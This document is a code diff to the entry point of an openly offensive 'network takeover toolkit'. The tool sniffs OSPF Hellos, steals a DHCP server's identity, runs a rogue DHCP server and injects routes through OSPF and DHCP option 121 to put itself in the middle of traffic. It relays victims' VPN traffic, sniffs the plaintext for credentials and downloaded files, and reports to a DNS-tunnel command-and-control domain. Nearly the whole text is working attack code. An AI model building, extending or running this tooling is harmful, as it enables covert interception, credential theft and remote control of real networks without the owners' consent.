@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
-# v2.0
+# v3.0
 """
 main.py — network takeover toolkit entry point.
 
 Orchestrates four modules in /final:
 
-    dhcp_takeover   DTP trunking, VLAN discovery, DHCP discovery, identity theft,
-                    and the rogue DHCP server (OFFER/ACK/NAK/RELEASE, opt121, DNS).
-    ospf_adjacency  OSPFv2 full-adjacency engine that injects a host route for our
-                    stolen DHCP-server IP (launched in its own terminal).
+    dhcp_takeover   DHCP discovery, identity theft, and the rogue DHCP server
+                    (OFFER/ACK/NAK/RELEASE, opt121, DNS).
+    ospf_adjacency  OSPFv2 passive Hello sniffing to learn SVI parameters, then
+                    full-adjacency engine that injects a /32 host route for our
+                    stolen DHCP-server IP.  Launched in its own terminal.
     vpn_relay       Detect/start the host VPN, then selectively relay victim traffic
                     bound for VPN subnets through the tunnel while everything else
                     passes straight to the real default gateway.
@@ -18,32 +19,34 @@ Orchestrates four modules in /final:
 
 Usage:
     sudo python3 main.py [--remote] [--domain DOMAIN] [--dns-server IP]
+                         [--target IP] [--ospf-timeout SECS]
 
 Options:
-    --remote / -r       Activate DNS tunnel C2 mode.  Performs a handshake to
-                        confirm the server is alive, then starts command polling.
-                        The debug menu's "Transmit to C2" option is enabled.
-    --domain DOMAIN     DNS zone for the C2 channel  (default: d.lootforge.org)
-    --dns-server IP     Resolver to use for C2 traffic  (default: system resolver)
+    --remote / -r           Activate DNS tunnel C2 mode.
+    --domain DOMAIN         DNS zone for the C2 channel  (default: d.lootforge.org)
+    --dns-server IP         Resolver for C2 traffic (default: system resolver)
+    --target IP             /32 host route to inject via OSPF (default: stolen
+                            DHCP server IP learned during offer sniffing)
+    --ospf-timeout SECS     Seconds to wait for an OSPF Hello (default: 30)
 
 Before running, set DEFAULT_INTERFACE in dhcp_takeover.py to the interface facing
 the target network (default: "eth0").  Root is required for raw sockets, iptables,
 and interface/route changes.  Linux (Kali) only.
 
 End-to-end flow:
-    1.  DTP trunk negotiation + PVST+ VLAN discovery.
-    2.  DHCPDISCOVER sweep across VLANs; capture DHCPOFFERs.
-    3.  Steal the offered client IP (static), inject a host route via OSPF, and
-        add the real DHCP server's IP to our loopback (identity theft).
-    4.  Detect the host VPN (start OpenVPN from an autologin profile if needed).
-        Derive the target /24 from the tun interface's assigned IP — e.g. tun0
-        gets 10.8.0.90/28, so we target 10.8.0.0/24 (covers the full class-C
-        regardless of what narrow prefix the VPN server assigned).
-    5.  Inject option 121 with exactly two routes: <tun /24> via our identity
-        (victims send VPN-subnet traffic to us, relayed through the tunnel), and
-        0.0.0.0/0 via the real router (all other traffic goes direct — fast path).
+    1.  Passively sniff OSPF Hellos on 224.0.0.5 to learn the SVI's area ID,
+        timers, netmask, and interface IP (= subnet gateway).
+    2.  DHCPDISCOVER on the learned subnet; capture DHCPOFFER.
+    3.  Steal the offered client IP (static), form a full OSPF adjacency matching
+        the SVI's parameters, inject a /32 host route for the target IP, and add
+        the real DHCP server's IP to our loopback (identity theft).
+        IP forwarding and iptables MASQUERADE rules are set up for transparent relay.
+    4.  Detect the host VPN (start OpenVPN if needed); derive the target /24.
+    5.  Inject option 121: <tun /24> via our identity + 0.0.0.0/0 via real router.
     6.  Sniff the carried plaintext for credentials and downloaded files.
     7.  Serve DHCP as the rogue server until interrupted.
+    8.  On exit: MaxAge-flood our Router-LSA (withdraws injected /32), remove
+        iptables rules, restore ip_forward.
 """
 
 import argparse
@@ -64,12 +67,6 @@ from dhcp_takeover import (
     DEFAULT_INTERFACE,
     DEFAULT_DHCP_DISCOVER_VLANS,
     IMPERSONATE_REAL_SERVER,
-    force_trunk,
-    countdown,
-    start_periodic_dtp_trunking,
-    stop_periodic_dtp_trunking,
-    sniff_pvst,
-    get_discovered_vlan_ids,
     send_DHCPDiscover_VLANs,
     sniff_worker,
     get_original_dhcp_server_ip,
@@ -87,7 +84,7 @@ from dhcp_takeover import (
 def _parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(
         prog="main.py",
-        description="Network takeover toolkit (DHCP + OSPF + VPN relay + HTTP capture)",
+        description="Network takeover toolkit (OSPF MITM + DHCP + VPN relay + HTTP capture)",
         formatter_class=argparse.ArgumentDefaultsHelpFormatter,
     )
     parser.add_argument(
@@ -107,6 +104,20 @@ def _parse_args() -> argparse.Namespace:
         metavar="IP",
         dest="dns_server",
         help="Resolver for C2 traffic (default: auto-detected system resolver)",
+    )
+    parser.add_argument(
+        "--target",
+        default=None,
+        metavar="IP",
+        help="Host IP for the injected /32 OSPF route (default: stolen DHCP server IP)",
+    )
+    parser.add_argument(
+        "--ospf-timeout",
+        default=30,
+        type=int,
+        metavar="SECS",
+        dest="ospf_timeout",
+        help="Seconds to wait passively for an OSPF Hello before aborting",
     )
     return parser.parse_args()
 
@@ -284,28 +295,41 @@ def debug_menu(networks: list, proposed_leases: dict, server_details: dict, c2_c
 
 # ── DHCP phases ───────────────────────────────────────────────────────────────
 
-def discover_offers(interface):
+def discover_offers(interface, ospf_params=None):
     """Run the threaded DHCPDISCOVER sweep and return the captured offers.
+
+    When ospf_params is provided (learned from sniff_ospf_hellos), the probe
+    is sent on the already-known subnet rather than sweeping VLANs 1-N.  The
+    OSPF Hello's src_ip/netmask identify the SVI's subnet exactly, so a single
+    targeted broadcast on that interface is sufficient.
 
     In a relay topology (ip helper-address) the DHCPOFFER can arrive within
     tens of milliseconds.  Scapy's sniff() needs ~100–200 ms to open its raw
-    socket and install the BPF filter.  If DISCOVERs are sent before the
-    sniffer is ready the OFFERs race past and are never captured — the 30 s
-    window expires with nothing.
-
-    Fix: wait 1 s after the sniffer thread starts (bind-wait), then retry
-    DISCOVERs every 8 s so any missed OFFERs are recovered on subsequent
-    attempts.  Three attempts span 17 s; the 30 s sniffer window covers all.
+    socket and install the BPF filter.  Fix: wait 1 s after the sniffer thread
+    starts (bind-wait), then retry every 8 s.  Three attempts span 17 s; the
+    30 s sniffer window covers all.
     """
-    pvst_network_map = sniff_pvst(interface)
-    discovered_vlan_ids = get_discovered_vlan_ids(pvst_network_map)
-    if discovered_vlan_ids:
-        print_step("OK", f"Using PVST+ discovered VLANs for DHCP probes: {discovered_vlan_ids}")
-        dhcp_probe_vlan_ids = discovered_vlan_ids
+    if ospf_params:
+        import ipaddress as _ip
+        try:
+            subnet = _ip.IPv4Network(
+                f"{ospf_params['src_ip']}/{ospf_params['netmask']}", strict=False
+            )
+            vlan_id = ospf_params.get("vlan_id")
+            dhcp_probe_vlan_ids = [vlan_id] if vlan_id else None
+            print_step(
+                "OK",
+                f"OSPF-learned subnet {subnet}; "
+                f"DHCP probe on {interface}"
+                + (f" VLAN {vlan_id}" if vlan_id else " (untagged)"),
+            )
+        except Exception:
+            print_step("WARN", "Could not derive subnet from OSPF params; falling back to VLAN sweep")
+            dhcp_probe_vlan_ids = DEFAULT_DHCP_DISCOVER_VLANS
     else:
         print_step(
             "WARN",
-            "No PVST+ VLANs discovered; falling back to the configured "
+            "No OSPF params available; falling back to configured "
             f"DHCPDISCOVER VLAN sweep: {list(DEFAULT_DHCP_DISCOVER_VLANS)}",
         )
         dhcp_probe_vlan_ids = DEFAULT_DHCP_DISCOVER_VLANS
@@ -330,7 +354,7 @@ def discover_offers(interface):
                 f"No OFFERs captured yet — retrying DHCPDISCOVER sweep "
                 f"(attempt {attempt}/3)",
             )
-        print_step("START", f"Sending DHCPDISCOVER packets across VLANs (attempt {attempt}/3)")
+        print_step("START", f"Sending DHCPDISCOVER packets (attempt {attempt}/3)")
         send_DHCPDiscover_VLANs(interface, dhcp_probe_vlan_ids)
         if attempt < 3:
             time.sleep(8)  # wait for OFFERs before the next attempt
@@ -342,13 +366,18 @@ def discover_offers(interface):
     return offers
 
 
-def steal_dhcp_identity(interface, selected_offer):
+def steal_dhcp_identity(interface, selected_offer, ospf_params=None, target_ip=None):
     """Take over the offered IP, form OSPF adjacency, and add the server identity.
+
+    ospf_params (from sniff_ospf_hellos) is threaded into the adjacency engine
+    so it sends Hellos matching the SVI's area, timers, and netmask exactly.
+    target_ip overrides the auto-injected /32 (default: real DHCP server IP).
 
     Returns the interface OSPF/DHCP runs on (a VLAN subinterface when tagged).
     """
     selected_vlan_id = selected_offer.get("vlan")
     original_dhcp_server_ip = get_original_dhcp_server_ip(selected_offer)
+    route_ip = target_ip or original_dhcp_server_ip
 
     print_step("START", f"Stealing DHCP server identity {original_dhcp_server_ip}")
     ospf_interface = ensure_vlan_subinterface(interface, selected_vlan_id)
@@ -357,11 +386,18 @@ def steal_dhcp_identity(interface, selected_offer):
     add_loopback_ipv4_address(original_dhcp_server_ip)
     print_step("OK", f"DHCP server identity {original_dhcp_server_ip} active on loopback")
 
+    area_id = ospf_params["area_id"] if ospf_params else None
+    hello_interval = ospf_params["hello_interval"] if ospf_params else None
+    dead_interval = ospf_params["dead_interval"] if ospf_params else None
+
     # OSPF engine runs in its own terminal so its interactive menu stays usable.
     ospf_adjacency.launch_in_terminal(
         ospf_interface,
         vlan_id=selected_vlan_id,
-        auto_route_ip=original_dhcp_server_ip,
+        auto_route_ip=route_ip,
+        area_id=area_id,
+        hello_interval=hello_interval,
+        dead_interval=dead_interval,
     )
     ospf_adjacency.wait_for_adjacency_exchange(ospf_interface, selected_address)
     return ospf_interface
@@ -384,33 +420,57 @@ def start_http_intercept(sniff_iface):
 # ── Entry point ───────────────────────────────────────────────────────────────
 
 def main():
-    print("Network Takeover Toolkit v2.7 — Starting...")
+    print("Network Takeover Toolkit v3.0 — Starting...")
     args = _parse_args()
     interface = DEFAULT_INTERFACE  # set in dhcp_takeover.py
 
     # ── C2 handshake (before any network activity so operator confirms aliveness)
     c2_config = _init_c2(args)
 
-    # ── Phase 1: trunk + VLAN discovery ──────────────────────────────────────
-    force_trunk(interface)
-    countdown("Allowing trunk negotiation to settle", 10)
+    # ── Phase 1: passive OSPF Hello sniffing to learn SVI parameters ─────────
+    print_step("START", f"Passive OSPF Hello sniff on {interface} (timeout={args.ospf_timeout}s)")
+    ospf_params = ospf_adjacency.sniff_ospf_hellos(interface, timeout=args.ospf_timeout)
+    if ospf_params is None:
+        print_step("FAIL", "No OSPF Hellos received — cannot learn SVI parameters. Aborting.")
+        return
 
-    dtp_stop_event, dtp_thread = start_periodic_dtp_trunking(interface)
+    # Enable IP forwarding early; save old value for teardown.
+    saved_ip_forward = ospf_adjacency.enable_ip_forwarding()
+
+    ospf_iface_for_fwd = None  # set after identity theft; used in teardown
     try:
-        # ── Phase 2: DHCP discovery ──────────────────────────────────────────
-        offers = discover_offers(interface)
+        # ── Phase 2: DHCP discovery on the OSPF-learned subnet ───────────────
+        offers = discover_offers(interface, ospf_params)
         if not offers:
             print_step("FAIL", "No DHCPOFFER packets received — aborting")
             return
 
-        # ── Phase 3: identity theft (static IP + OSPF + loopback) ────────────
+        # ── Phase 3: identity theft (static IP + OSPF adjacency + loopback) ──
         selected_offer = offers[0]
-        ospf_interface = steal_dhcp_identity(interface, selected_offer)
+        ospf_interface = steal_dhcp_identity(
+            interface, selected_offer,
+            ospf_params=ospf_params,
+            target_ip=args.target,
+        )
+        ospf_iface_for_fwd = ospf_interface
+
+        # Set up iptables forwarding rules: traffic arriving on ospf_interface
+        # is MASQUERADEd out via the upstream physical interface.
+        ospf_adjacency.setup_forwarding(ospf_interface, interface)
 
         # ── Phase 4+5: VPN relay + option 121 policy ─────────────────────────
         networks = []
         proposed_leases = {}
         server_details = build_server_details_from_offer(ospf_interface, selected_offer, offers)
+
+        # Prefer the OSPF-learned SVI IP as the default gateway in leases we
+        # hand out — it's authoritative and may be absent from the DHCP offer
+        # when a relay (ip helper-address) is in use.
+        svi_gw = ospf_params.get("src_ip")
+        if svi_gw and not server_details.get("gateway"):
+            server_details["gateway"] = svi_gw
+            print_step("OK", f"Using OSPF-learned SVI IP {svi_gw} as default gateway in DHCP leases")
+
         tun_iface = vpn_relay.enable_vpn_relay(server_details, ospf_interface)
 
         # ── Phase 6: HTTP interception on the traffic we now carry ───────────
@@ -445,7 +505,14 @@ def main():
         print_step("OK", f"DHCP server finished: {len(handled_events)} event(s) handled")
         return handled_events
     finally:
-        stop_periodic_dtp_trunking(dtp_stop_event, dtp_thread)
+        # ── Phase 8: teardown ─────────────────────────────────────────────────
+        # LSA withdrawal (MaxAge-flood our Router-LSA) is handled automatically
+        # by the adjacency engine subprocess on its own KeyboardInterrupt.
+        # Here we clean up the iptables rules and restore ip_forward.
+        print_step("START", "Teardown: removing forwarding rules and restoring system state")
+        if ospf_iface_for_fwd:
+            ospf_adjacency.teardown_forwarding(ospf_iface_for_fwd, interface)
+        ospf_adjacency.restore_ip_forwarding(saved_ip_forward)
 
 
 if __name__ == "__main__":
